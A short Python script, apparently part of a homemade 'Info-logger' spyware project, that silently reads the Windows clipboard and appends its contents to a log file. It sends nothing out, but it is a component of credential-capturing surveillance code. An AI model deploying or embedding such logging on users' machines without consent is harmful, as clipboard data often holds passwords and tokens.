import win32clipboard

clipboard_information = "clipboard.txt"

clipboard_information_e = "e_clipboard.txt"

file_path = "C:\Info-logger\Logged_information"
extend = "\\"
file_merge = file_path + extend

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()